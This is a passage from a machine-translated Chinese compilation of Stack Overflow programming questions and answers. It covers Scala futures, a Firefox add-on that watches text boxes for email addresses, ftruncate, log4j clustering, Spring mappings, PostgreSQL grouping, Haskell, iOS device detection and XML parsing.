        maybeRecord <- fetch(id)
      } yield {
        for {
          record <- maybeRecord
        } yield {
          for {
            uploadedId <- upload(record)
          } yield uploadedId
        }
      }
    }
    val result2: Future[Seq[Option[Future[String]]]] = Future.sequence(result)
    val result3: Future[Unit] = result2.flatMap { x: Seq[Option[Future[String]]] =>
      Future.sequence(x.flatten).map(notifyUploaded)
    }
    Await.result(result3, Duration.Inf)
  }

  def mapAndFlatMapImpl() = {
    val res: Seq[Future[Iterable[String]]] = ids.map { id =>
      fetch(id).flatMap { maybeRecord =>
        val res1: Option[Future[Seq[String]]] = maybeRecord.map { record =>
          upload(record) map (Seq(_))
        }
        res1 match {
          case Some(a) => a
          case None => Future(Seq())
        }
      }
    }
    val res3: Future[Unit] = Future.sequence(res) map (a => notifyUploaded(a.flatten))
    Await.result(res3, Duration.Inf)
  }
} 
```

# javascript - 如何设置事件侦听器以使用 JavaScript 从 HTML 源代码中侦听文本框？

> ID：15154261
> 
> 赞同：0
> 
> 时间：2013-03-01T09:18:48.673
> 
> 标签：javascript, html, firefox-addon, event-listener

目前正在用 JavaScript 开发一个 Firefox 插件。它会扫描网页以查找特定内容，例如电子邮件地址。有没有办法让它读取网站的源代码并将事件侦听器设置到文本框，然后可以检测用户是否在任何网站的文本框中输入电子邮件地址。不确定这在 JavaScript 中是否可行，因为我是新手。如果用户在网站上输入电子邮件地址，我需要能够显示警报，但因为这将从 Firefox 插件运行。几乎就像您在网站上将其用于验证目的时会显示一样。但由于这是来自 Firefox 插件，它的工作方式并不完全相同。我看过 GreaseMonkey 但它非常令人困惑，当试图具体找出是否可以完成时，我被卡住了。

我怎么能实现这将是伟大的，甚至它是否可能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:26:24.573

你可以这样做：

```
window.onload = function () {
    var inputs = document.getElementsByTagName('input');
    for (i = 0; i < inputs.length; i++) {
        inputs[i].onkeypress = function () {
            if (this.value.match(/^([0-9a-zA-Z]([-\.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$/)) {
                // do something
                alert('Looks like an email address!');
            }
        };
    }
}; 
```

在这里试试：http: [//jsfiddle.net/samliew/49cny/](http://jsfiddle.net/samliew/49cny/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:28:27.700

你可以加一个`event listener`赞：

**句法**

```
target.addEventListener(type, listener[, useCapture]);
target.addEventListener(type, listener[, useCapture, aWantsUntrusted Non-standard]); // Gecko/Mozilla only 
```

来自[https://developer.mozilla.org/en/docs/DOM/element.addEventListener](https://developer.mozilla.org/en/docs/DOM/element.addEventListener)

**例如**

```
document.getElementById('inputid').addEventListener("keypress", function(){/* Your code */}, false); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-17T04:37:52.447

你会使用`jQuery .keyPress() function`下面是一个例子......在`#target`哪里`ID`。`Textbox`

```
var i=0;
$( "#target" ).keypress(function() {
i++;
console.log("Kep Pressed: " + i);
} 
```

# android - 为什么@+登录android，请解释一下

> ID：15154262
> 
> 赞同：0
> 
> 时间：2013-03-01T09:18:51.080
> 
> 标签：android

我没有得到作者想要解释的内容，所以请解释一下，“在布局 (XML) 文件中第一次出现给定 android:id 时使用 @+。它可能在视图的定义中，也可能在在引用中 - 哪个是第一个。在上面的示例中，EditText 视图在 Button 之前定义。因此，@+ 用于 EditText 中的 android:id 属性。但是，如果首先定义 Button，则 @+将用于 Button 中的相对布局定位" ,

..

阅读更多： http: [//www.intertech.com/Blog/Post/Android-Layout-and-ID-Attribute.aspx#ixzz2MHHdt1wv](http://www.intertech.com/Blog/Post/Android-Layout-and-ID-Attribute.aspx#ixzz2MHHdt1wv)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:21:32.503

`@+`意思是，如果这个 id 还不存在，它将被创建，否则将使用已经创建的 id。如果您查看 R.java - ids 是一些数字常量。

如果你只写`@`- 你应该确定，那个 id 已经创建了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:22:39.170

看看[这里](http://developer.android.com/guide/topics/ui/declaring-layout.html)。它解释了很多，看看ID部分。

> 字符串开头的 at 符号 (@) 表示 XML 解析器应该解析和扩展 ID 字符串的其余部分，并将其标识为 ID 资源。加号 (+) 表示这是一个新资源名称，必须创建并添加到我们的资源中（在 R.java 文件中）。Android 框架提供了许多其他 ID 资源。引用 Android 资源 ID 时，不需要加号，但必须添加 android 包命名空间，如下所示：

```
android:id="@android:id/empty" 
```

# c++ - 截断或调整文件大小以修改其结尾

> ID：15154263
> 
> 赞同：1
> 
> 时间：2013-03-01T09:18:51.243
> 
> 标签：c++, file, binary, resize

我有一个`FILE* file`包含一些二进制数据的。假设这个数据是一个双精度列表，最后一个条目是一个字符串，描述了这些双精度是什么。我想修改这个字符串（新字符串可能更短）。所以首先我删除旧字符串。我需要找到字符串的起点：

```
fseek(file,-size(sring.size()),SEEK_END); 
```

然后我该怎么办？我找到[了 Delete End of File](https://stackoverflow.com/questions/4005199/delete-end-of-file)链接，但我不知道要使用哪一个...一旦文件被重新调整大小，我可以简单地使用写我的新字符串`fwrite`吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T09:44:06.400

iostream 和 iostream都不`FILE*`支持截断。如果要编辑文件以使新文件比旧文件短，有两种解决方案：

*   通常的解决方案是将原始文件复制到一个新文件中，随时进行任何更改。完成后，关闭新文件，确认没有错误（重要一点），然后删除原始文件并重命名为新文件以使用原始名称。如果存在指向原始文件的硬链接，这可能会导致 Unix 系统出现问题。（一般情况下，这不是问题，因为现在大家都在使用软链接。如果是，你应该`stat`原件，如果`st_nlink`字段大于1，将新文件复制到原件上，然后删除新文件。 ) 另一方面，它是最通用的选项；它适用于文件中任何位置的所有类型的修改。

*   通常在较低级别有系统特定的功能来截断文件。在 Unix 下，这是`ftruncate`. 但是您需要先找到要截断的字节数；`ftruncate`需要一个打开的文件，但它不会在文件的当前位置截断。所以你必须 1) 在文件中找到最后一行的开头，2) 寻找它，3) 写入新值，4) 调用`ftell`（或者`ftello`，如果长度可能太大而无法放入 a `long`）找到新的结束位置。此时，您遇到了 `FILE*`与较低级别同步的问题；就我个人而言，我要`fclose`文件，然后用 重新打开它，然后`open`从`ftruncate`这个打开的文件描述符上执行。（事实上​​，就我个人而言，我会使用`open`, `read`,`lseek`, `write`,`ftruncate` 和`close`. 或许`stat`可以预先找出文件长度。如果您不必翻译双打，那真的没有什么可以`FILE*`增加的。

作为一般规则，我会使用第一个解决方案，如果结果太慢，只尝试第二个解决方案。（例如，如果文件包含数十亿个双精度数，复制它们将需要一些时间。）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-01T09:23:03.627

如果您想调整文件大小，那么`ftruncate()`( [http://www.linuxmanpages.com/man2/ftruncate.2.php](http://www.linuxmanpages.com/man2/ftruncate.2.php) ) 就是您正在寻找的功能。不过，您需要调用结构来获取`fileno()`的`FILE *`文件描述符`ftruncate()`。

至于在文件减小后追加新数据（新字符串），只需寻找到末尾（`fseek(file, 0, SEEK_END)`）并`fwrite()`在那里 'ing 就可以了。

**编辑：**`fflush()`记得在截断文件之前打电话！

# java - 在 Weblogic 集群环境中登录 -LINUX

> ID：15154267
> 
> 赞同：0
> 
> 时间：2013-03-01T09:19:07.170
> 
> 标签：java, linux, log4j, weblogic, cluster-computing

我有一个包含 oj JSP、Servlet 和 cosumes Webservices 的应用程序。我正在使用 lo4j.propetties 来记录事件。此应用程序部署在 Weblogic 上的集群上，该集群由两台不同机器上的 2 台服务器组成。其内容是

```
log4j.rootLogger=DEBUG,CA1, FA1

log4j.appender.FA1=org.apache.log4j.DailyRollingFileAppender
log4j.appender.FA1.DatePattern = '.'yyy-MM-dd
log4j.appender.FA1.File=ABC.log 
log4j.appender.FA1.layout=org.apache.log4j.PatternLayout
log4j.appender.FA1.layout.ConversionPattern=%d{dd MMM yyyy HH:mm:ss,SSS} [%-5p] - %c - %m%n

log4j.appender.CA1=org.apache.log4j.ConsoleAppender 
log4j.appender.CA1.layout=org.apache.log4j.PatternLayout 
log4j.appender.CA1.layout.ConversionPattern=%d{dd MMM yyyy HH:mm:ss,SSS} [%-5p] - %c - %m%n 
```

创建这些日志文件的位置是

/u01/CRM/domains/e09/domain_CRM/ABC.log 和

/u01/CRM/domains/e10/domain_CRM/ABC.log

由于我的服务器在不同的机器上，因此我需要一个集中的 loogign 放置这样的东西

/u01/CRM/logs/server1/ABC.log

/u01/CRM/logs/server2/ABC.log

我怎么做

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:38:50.507

依赖[SocketAppender](http://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/net/SocketAppender.html)是集群环境中的常用方法。您将需要一个额外的 log4j 服务器，它将所有日志消息聚合到一个共享文件中。查看这些 SO 讨论以了解详细信息：

*   [集群环境中的 Log4j](https://stackoverflow.com/questions/13901970/log4j-in-clustered-environment)
*   [如何使用 SocketAppender](https://stackoverflow.com/questions/11759196/log4j-how-to-use-socketappender)

# android - 无法在Android中将图片消息（mms）从一个模拟器发送到另一个模拟器

> ID：15154268
> 
> 赞同：0
> 
> 时间：2013-03-01T09:19:08.250
> 
> 标签：android

有人知道如何在两个模拟器之间发送彩信吗？它成功发送短信但不是带有图片的彩信。

提前致谢

我已经以编程方式发送 mms，并且用户通过操作系统提供发送按钮，但它显示发送...

我已经在两个 5554 和 5556 的模拟器上成功发送了短信，但是对于带有图片的彩信，点击发送按钮后它显示“正在发送...”

```
String imagePath="test.jpeg";
            Intent sendIntent = new Intent(Intent.ACTION_SEND);
        //    sendIntent.setClassName("com.android.mms", "com.android.mms.ui.ComposeMessageActivity");
            sendIntent.putExtra("sms_body", "I Send you pic.");
            sendIntent.putExtra("address", phoneNumber);
            sendIntent.setType("image/png");
            sendIntent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(dataFile));
   //         context.startActivityForResult(sendIntent, 1);
            context.startActivity(Intent.createChooser(sendIntent, "Send")); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:10:33.457

根据 Android SDK 发行说明（[http://developer.android.com/sdk/RELEASENOTES.html](http://developer.android.com/sdk/RELEASENOTES.html)）

无法在模拟器实例之间发送 MMS 消息。

# python - 在 matplotlib 中注释图

> ID：15154269
> 
> 赞同：-2
> 
> 时间：2013-03-01T09:19:14.707
> 
> 标签：python, matplotlib

在这我可以包含一个注释，例如'line1'

```
plt.axvspan(76, 76, facecolor='g', alpha=1)
plt.show() 
```

或任何其他用于注释图中跨度的示例？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:28:14.750

最好使用matplotlib的[annotate 函数来完成注释。](http://matplotlib.org/1.2.0/api/pyplot_api.html#matplotlib.pyplot.annotate)这可以读

```
import matplotlib.pyplot as plt

plt.axvspan(76, 76, facecolor='g', alpha=1)
plt.annotate('line1', (76, 0.75))
plt.show() 
```

# spring - 在 Spring 框架中配置多个请求映射

> ID：15154273
> 
> 赞同：0
> 
> 时间：2013-03-01T09:19:35.097
> 
> 标签：spring

我在请求映射中有一个小问题，

我有`controllerA`请求映射作为

```
@Controller
@RequestMapping(value={"login/formA.html", "B/formB.html", "C/formC.html"})
public class ControllerA {
} 
```

我需要在不干扰现有控制器的情况下再创建一个控制器，

第二个控制器的请求映射，如下所示

```
@Controller
@RequestMapping(value={"X/test1", "Y/test2", "Z/test3"})
public class ControllerB {
} 
```

如何配置`spring-servlet.xml`以配置上述场景并使其工作。

我有`web.xml`：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_ID" version="2.4"
    xmlns="https://java.sun.com/xml/ns/j2ee" xmlns:xsi="https://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="https://java.sun.com/xml/ns/j2ee https://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
    <servlet>
        <servlet-name>spring</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet
        </servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>
        <servlet-mapping>
        <servlet-name>spring</servlet-name>
        <url-pattern>/public/login/*</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>spring</servlet-name>
        <url-pattern>/public/signout/*</url-pattern>
    </servlet-mapping>

    <servlet-mapping>
        <servlet-name>spring</servlet-name>
        <url-pattern>/public/X/*</url-pattern>
    </servlet-mapping>

</web-app> 
```

我的`spring-servlet.xml`：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:p="http://www.springframework.org/schema/p"
    xmlns:context="http://www.springframework.org/schema/context"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context-3.0.xsd">

    <mvc:annotation-driven/>

    <context:component-scan
        base-package="com.abc.xyz.controller"/>

    <context:component-scan
        base-package="com.abc.xyz.controller.example1"/>    

    <bean class="org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping" />

    <bean class='org.springframework.web.servlet.view.ContentNegotiatingViewResolver' p:order='1'>
            <property name='mediaTypes'>
                  <map>
                        <entry key='json' value='application/json' />
                        <entry key='html' value='text/html' />
                  </map>
            </property>

            <property name='viewResolvers'>
                  <list>
                        <bean class='org.springframework.web.servlet.view.BeanNameViewResolver' />
                        <bean class='org.springframework.web.servlet.view.UrlBasedViewResolver'>
                              <property name="viewClass" value="org.springframework.web.servlet.view.JstlView"/>
                              <property name="prefix" value="/WEB-INF/jsp/"/>
                              <property name="suffix" value=".jsp"/>
                        </bean>
                  </list>
            </property>

      </bean> 
```

请给我建议来解决这个问题，几天后就解决了。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:27:10.863

在 web.xml 中再添加一个 servlet 映射，如下所示

```
<servlet-mapping>
    <servlet-name>spring</servlet-name>
    <url-pattern>/public/*/*</url-pattern>
</servlet-mapping> 
```

# sql - 如何使postgresql结果唯一

> ID：15154277
> 
> 赞同：1
> 
> 时间：2013-03-01T09:19:43.650
> 
> 标签：sql, postgresql, openstreetmap

这有点难以描述，但是我有一个 postgresql 9.1 表（planet_osm_roads）。我的查询是

```
SELECT
    osm_id, name, highway, way, md5(astext(way)) AS md5
FROM planet_osm_roads
WHERE highway IS NOT NULL
AND md5(astext(way)) IN (
    SELECT DISTINCT md5(astext(way))
    FROM planet_osm_roads
    WHERE highway IS NOT NULL
    GROUP BY md5
    HAVING count(osm_id) > 1
)
ORDER BY osm_id 
```

结果是

```
 osm_id  | name |    highway    |       ...way ...  |               md5                
----------+------+---------------+-------...----...--+----------------------------------
 -1641383 |      | motorway      | 010200...CA96...0 | 04b4336b997e7ea9d99208bd487bbe7d
 -1641383 |      | motorway      | 010200...EC3E...0 | ae945148417ada285130c59277c48a25
 -1641383 |      | motorway      | 010200...7BF6...0 | 5c5a1b8ae40c1b7f24e293a012ad2add
 23133731 |      | motorway_link | 010200...EC3E...0 | ae945148417ada285130c59277c48a25
 31309105 |      | motorway      | 010200...7BF6...0 | 5c5a1b8ae40c1b7f24e293a012ad2add
 49339926 |      | motorway      | 010200...CA96...0 | 04b4336b997e7ea9d99208bd487bbe7d
(6 rows) 
```

我想要一个包含 3 行（每个 md5 哈希一个）和*任何*其他相应行的结果。因此，“ae945148417ada285130c59277c48a25”的有效行可能包含 osm_id-highway 对“-1641383”和“motorway”或“23133731”和“motorway_link”——我不介意并且认为两者都是正确的。

我该如何解决这个问题以及如何调用所需的操作/技术？所以我下次知道如何将其称为要搜索的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T12:16:45.937

```
select
    md5(astext(way)) as md5,
    min(osm_id) osm_id,
    min(name) name,
    min(highway) highway,
    min(way) way
from planet_osm_roads
where highway is not null
group by 1
having count(osm_id) > 1 
```

# vb.net - 如何构建用于开发和测试的 GIT 存储库？

> ID：15154278
> 
> 赞同：0
> 
> 时间：2013-03-01T09:19:46.693
> 
> 标签：vb.net, visual-studio, git

在过去的 2 年里，我们一直在将 GIT 与 Visual Studio 2008 一起使用，并且对它为我们提供的功能感到满意。我们今天已经启用了新系统，从下周开始，我们需要开始为系统的 v2.0 实施新功能，但是我们不希望人们在登录后立即接受这些更改，直到 v2.0 发布完成的。

我听说过分支，但我自己从未使用过它们，我相信它们会为我们提供所需的功能。

所以我的问题是：构建我们的存储库以便我们可以在不影响实时系统的情况下开发 v2.0 的最佳方式是什么？

我们目前只有一个仓库和一个分支，公司有两个开发人员。我想我们将需要一个名为“开发”的新分支或类似的 v2.0 分支，现有分支将用于当前系统的错误修复。

任何建议和提示将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:26:27.200

分支：git checkout -b 分支名

git commit -am “你的改变”

合并：git checkout 分支名

git merge 合并分支名称

您也可以在客户端中创建本地分支

有关详细信息，请查看此[链接](http://git-scm.com/book/en/Git-Branching-Basic-Branching-and-Merging)

# php - cakephp v2.3如何在appController中调用插件函数

> ID：15154284
> 
> 赞同：2
> 
> 时间：2013-03-01T09:20:05.120
> 
> 标签：php, cakephp, cakephp-2.3

我是蛋糕 php 的新手。你能告诉如何在应用程序/控制器功能中调用插件功能吗？我加载了插件，但不知道如何使用它的功能。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:36:03.990

只要您包含一个插件，您就可以轻松地使用它的模型，例如：

```
$this->ModelName = ClassRegistry::init('PluginName.ModelName');
$this->ModelName->foo(); 
```

对于库和其他类 App::uses() 他们：

```
App::uses('MyCoolPluginLib', 'PluginName.Lib');
$Lib = new MyCoolPluginLib(); 
```

# php - 从 HTML 文件中解析 id 和类名

> ID：15154290
> 
> 赞同：0
> 
> 时间：2013-03-01T09:20:37.160
> 
> 标签：php, html, cakephp, dom

我能够使用 getElementByTagName 从 html 文件中解析标签。但我也想解析该html文件中存在的id和类名......

这是我尝试过的：-

```
 $html = new DOMDocument();
    $html->loadHTMLFile($url); //url is the url of the site
    $data = $html->getElementById($identifier); //identifier is the id
    $value = array();

    foreach($data as $element)
    {
        $value[] = $element->nodeValue."<br />";
    }
    print_r($value); 
```

但是当我使用 getElementById 时，我只是将输出作为数组（）。我无法解析数据。你也能告诉我如何获取 id 和 classname 值吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:31:01.970

我知道一个很棒的工具 php query [phpquery](https://code.google.com/p/phpquery/)。

```
phpQuery::newDocumentFileXHTML('my-xhtml.html')->find('#hello'); 
```

在这里您可以找到 [示例](https://code.google.com/p/phpquery/wiki/Basics)。

或者你可以使用 xpath 它也很好[xpath](http://php.net/manual/ru/simplexmlelement.xpath.php)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:35:13.330

无需执行 foreach 循环，因为只能有一个具有给定 ID 的元素：

```
$doc = new DOMDocument();
$doc->loadHTMLFile('http://stackoverflow.com/questions/15154290/parsing-the-ids-and-classnames-from-a-html-file');

$element = $doc->getElementById('question');
if (!is_null($element)) {
    echo $element->getAttribute('class');
} 
```

# haskell - 让奇怪的行为

> ID：15154291
> 
> 赞同：0
> 
> 时间：2013-03-01T09:20:37.740
> 
> 标签：haskell, let

我有以下程序：

```
mnr = [0,1,2,3,4,5,6]  :: [Int]
name = "Max Mustermann" :: String
kzn = "e53X" :: String

t1 = ("p1",(take 2.tail)mnr, (take 3.words.(let no n= name;in no))"No");
{-result: t1 == ("p1",[1,2],["Max","Mustermann"]) -} 
```

为什么“否”会被忽略，有什么作用`let no n= name;in no`？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-01T09:29:28.287

这是相当疯狂的编写代码。让我们尝试一块一块地解决它。

首先，`t1`是一个类型的元组`(a,b,c)`。让我们写下来`t1 = (x,y,z)`，试着弄清楚。很清楚`a`是`String`和`x`是`"p1"`。

第二个组成部分是`((take 2) . tail) mnr`，这是`take 2 [1,2,3,4,5,6]`，这是`[1,2]`。如此，如此。`b`_ 说得通。`[Int]``y``[1,2]`

第三部分写得很奇怪。首先，

```
let no n = name in no 
```

简单地定义了一个函数`\n -> name`，即返回的常量函数`name`。这写得更好`const name`。这样你就有了构图`(take 3) . words . (const name)`，然后你把它应用到`"No"`. 嗯，`(const name) "No"`显然只是`name`，即`"Max Mustermann"`。所以`words`应用到 this is `["Max", "Mustermann"]`，然后`take 3`得到前三个元素，这又是`["Max", "Mustermann"]`。这就是`z`上面，并表明它`c`是`[String]`.

总而言之，你最终`t1`拥有 type`(String, [Int], [String])`和 value `("p1", [1,2], ["Max", "Mustermann"])`。

* * *

应该清理第三个组件的代码，但是如何清理它取决于您以后真正想做的事情。然而，就目前而言，它非常复杂，只会让你和其他人感到困惑。

# ios - 使用shell或python检测在Mac上连接/运行的iOS设备/模拟器？

> ID：15154292
> 
> 赞同：3
> 
> 时间：2013-03-01T09:20:38.863
> 
> 标签：ios, iphone, macos, ipad, simulator

我正在为**越狱**的iOS 设备开发一个工具。该工具将在 Mac OS 10.8 上运行。

这是我想要实现的目标：

*   当我运行该工具（最好是`sh`或`py`某些脚本）时，它应该能够检测到模拟器是否正在运行，或者
*   如果连接了 iPhone/iPad，并且
*   列出所有此类设备（真实/虚拟）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:59:44.530

要检测连接的 iPhone，[请查看此答案](https://stackoverflow.com/a/3820288/119114)。像这样的东西：

```
$ system_profiler SPUSBDataType | grep iPhone 
```

将检测 iPhone 是否已连接（您可能需要为 iPad 使用不同的 grep）。

该命令的完整（er）输出，没有`| grep iPhone`是：

```
 iPhone:

          Product ID: 0x12a8
          Vendor ID: 0x05ac  (Apple Inc.)
          Version: 5.10
          Serial Number: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
          Speed: Up to 480 Mb/sec
          Manufacturer: Apple Inc.
          Location ID: 0xfa120000 / 5
          Current Available (mA): 500
          Current Required (mA): 500
          Extra Operating Current (mA): 500 
```

因此，根据您希望脚本输出的样子，您可能需要使用自己喜欢的脚本语言来解析上述内容。

要检测模拟器，请尝试以下操作 (†)：

```
$ ps -A | grep "iPhone Simulator " 
```

产生：

> 501 12115 135 0 上午 1 点 53 分？0:06.12 /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/Applications/iPhone Simulator.app/Contents/MacOS/iPhone Simulator-SessionOnLaunch NO

如果没有关于输出外观的具体指导，很难为您提供更多信息。与任何脚本任务一样，您应该使用您擅长的语言编写它。

希望这是一个开始。也许其他人可以以此为基础，或提出替代方案。

## 更新

† 在较新的 SDK 版本上，您必须使用 grep 获取模拟器

```
$ ps -A | grep "iOS Simulator" 
```

# ios - 如何从 Objective-C 中的 XPath 获取 1 个属性

> ID：15154295
> 
> 赞同：0
> 
> 时间：2013-03-01T09:20:44.443
> 
> 标签：ios, objective-c, xml, xcode, xpath

我正在为 XPath 和本教程使用 GDataXML 库：[http ://www.raywenderlich.com/725/how-to-read-and-write-xml-documents-with-gdataxml](http://www.raywenderlich.com/725/how-to-read-and-write-xml-documents-with-gdataxml)

他的 xml 看起来像这样：

```
<Party>
  <Player>
      <Name>Butch</Name>
      <Level>1</Level>
      <Class>Fighter</Class>
      <HP>20</HP>
      <MaxHP>20</MaxHP>
  </Player>
  <Player>
      <Name>Shadow</Name>
      <Level>2</Level>
      <Class>Rogue</Class>
      <HP>15</HP>
      <MaxHP>15</MaxHP>
  </Player>
  <Player>
      <Name>Crak</Name>
      <Level>3</Level>
      <Class>Wizard</Class>
      <HP>10</HP>
      <MaxHP>10</MaxHP>
  </Player> 
```

但是如果 Name 标签中有一个属性，像这样：

```
<Player>
    <Name color="red">Butch</Name> // Color attribute 
    <Level>1</Level>
    <Class>Fighter</Class>
    <HP>20</HP>
    <MaxHP>20</MaxHP>
</Player> 
```

如果您查看教程，他会得到以下信息：

```
Party *party = [[[Party alloc] init] autorelease];
NSArray *partyMembers = [doc.rootElement elementsForName:@"Player"];
for (GDataXMLElement *partyMember in partyMembers) {

// Let's fill these in!
NSString *name;
int level;
RPGClass rpgClass;

// Name
NSArray *names = [partyMember elementsForName:@"Name"];
if (names.count > 0) {
    GDataXMLElement *firstName = (GDataXMLElement *) [names objectAtIndex:0];
    name = firstName.stringValue;
} else continue;
...etc 
```

他正在使用一个包含所有partyMembers 的for 循环，并获取每个标签，但是如果标签具有我之前解释的颜色的属性怎么办？

我试过这个：

```
 NSArray *colors = [partyMember nodesForXPath:@"string(/Player/Name/@color)"   error:nil] ;
    if (colors != nil && colors.count > 0) {
        GDataXMLElement *firstColor = (GDataXMLElement *) [colors objectAtIndex:0];
        NSString *color = firstColor.stringValue;
        NSLog(@"%@",color);
    } 
```

但这无济于事。知道我做错了什么吗？

**编辑：** 这有效：

```
 NSArray *colors = [partyMember nodesForXPath:@"//Player/Name/@color" error:nil] ;
    if (colors != nil && colors.count > 0) {
        GDataXMLElement *firstColor = (GDataXMLElement *) [colors objectAtIndex:0];
        NSString *color = firstColor.stringValue;
        NSLog(@"%@",color);
    } 
```

但如果你有更多这样的颜色标签：

```
 <Player>
    <Name color="red">Butch</Name> // Color attribute 
    <Level>1</Level>
    <Class>Fighter</Class>
    <HP>20</HP>
    <MaxHP>20</MaxHP>
</Player>
    <Player>
    <Name color="red">Butch</Name> // Color attribute 
    <Level>1</Level>
    <Class>Fighter</Class>
    <HP>20</HP>
    <MaxHP>20</MaxHP>
</Player>
    <Player>
    <Name color="red">Butch</Name> // Color attribute 
    <Level>1</Level>
    <Class>Fighter</Class>
    <HP>20</HP>
    <MaxHP>20</MaxHP>
</Player> 
```

然后它会打印出 3 次红色，我只需要从第一个窗口中获取它，然后在 for 循环中进行第二次迭代，以此类推。

所以我在想这个：

```
 NSArray *colors = [partyMember nodesForXPath:@"//Player[0]/Name/@color" error:nil] ;
    if (colors != nil && colors.count > 0) {
        GDataXMLElement *firstColor = (GDataXMLElement *) [colors objectAtIndex:0];
        NSString *color = firstColor.stringValue;
        NSLog(@"%@",color);
    } 
```

我添加了 Player[0] ，后来我需要用 for 循环的迭代次数来改变它，但这不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:36:23.817

请检查此代码：

```
 NSArray *colors = [doc nodesForXPath:@"//Party/Player/Name/@color" error:NULL];
 for (GDataXMLElement *color in colors)
 {
     NSLog(@"Color : %@ ",[color stringValue]);
 } 
```

这里：

`doc`是你的`GDataXMLDocument`

编辑：

如果您需要设置与每个名称标签对应的单独颜色，请在您的 loadParty 方法中更改：

```
// Name
NSArray *names = [partyMember elementsForName:@"Name"];
if (names.count > 0)
{
    GDataXMLElement *firstName = (GDataXMLElement *) [names objectAtIndex:0];
    NSLog(@"Color : %@",[[firstName attributeForName:@"color"] stringValue]);
    name = firstName.stringValue;
 } else continue; 
```

# c++ - 存储 4 个不同的名称和指针以供将来使用

> ID：15154296
> 
> 赞同：0
> 
> 时间：2013-03-01T09:20:45.510
> 
> 标签：c++, visual-c++, function-pointers

我有一个名为 Pagemanager 的函数类，它是这样的

```
class Page : public Ipage //Ipage is abstract with pure virtual function
{
public: 
      page(void);
      ~page(void);
      virtual int FillDbgPage(char* sz, unsigned int max_bytes, 
      char* arg1, char*    arg2,  char* arg3, char* arg4){return 0;}
 };

//Pagemanager.h
class pageManager : public IPage
{
public:
      pageManager(void);
      ~pageManager(void);

      //client calls this function to register himself as a page content owners
      void registerPage(char* PageName, Page* PagePtr)

      //webserver calls this function to request page update
      int FillDbgPage(char* sz, unsigned int max_bytes, 
      char* arg1, char* arg2,  char* arg3, char* arg4);

Private:
       char name[10];    //stores the name of the page 
       Ipage* storePagePtr; //stores the address of the page
};

//pageManager.cpp
int pageManager::FillDbgPage(char* sz, unsigned int max_bytes, char* arg1, 
char*  arg2,  char* arg3, char* arg4)
{
if(arg4!=NULL)
{
  if (strcmp(arg4, name)==0)
  {
   cout<<"Page"<<arg4<<"Found"<<endl;

     if(storePagePtr==Null)
      cout<<"storePagePtr not initialized"<<endl;
     else
       int len = storePagePtr->FillDbgPage(sz, max_bytes, arg1, arg2, arg3, arg4);
   else
     cout<<"Sorry"<<arg4<<not found!<<endl;
else
{
 strcat(sz, ("<a href = http://127.0.0.1/dbg_image_pipe?arg4="));
 strcat(sz, name);
 strcat(sz,">");
 strcat(sz, name);
 strcat)sz, "<br>");
 strcat(sz, ("</a>\n"));
}
return strlen(sz);
}
void pageManager::RegisterPage(char* PageName, Page *PagePtr)
{
 storePagePtr= PagePtr;
 strcpy(name, PageName);
}

//this is code from cpp file which will be done by end users for example
pageManager systemRegister;
class myPage1 : public Page
{
public:
       virtual int FillDbgPage(char* sz, unsigned int max_bytes, char* arg1, 
       char* arg2,  char* arg3, char* arg4)
{
      //sample content that user will print in the page he created
      sprintf(sz, "Hello World"! <br> This is my page!);
      return strlen(sz);
}

myPage1 Page1;

void module1_initialize()
{
systemRegister.RegisterPage("Page1", &Page1);
} 
```

问题是现在创建了 1 页，它存储在 name 和 sotrePagePtr 中，但是如果有 4 页，我该怎么办。假设用户想要 4 个不同的文件，我如何正确保存它们以便将来显示它们变得更容易

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:44:38.253

使用例如`std::vector<Page*>`和`RegisterPage`使用`push_back`方法。如果要为每个页面添加名称，则应在结构或类中处理页面及其名称，并`std::vector`与此结构或类一起使用

# add-in - 删除 Office 2013 插件工具提示

> ID：15154301
> 
> 赞同：0
> 
> 时间：2013-03-01T09:21:10.683
> 
> 标签：add-in, ribbon, office-2013

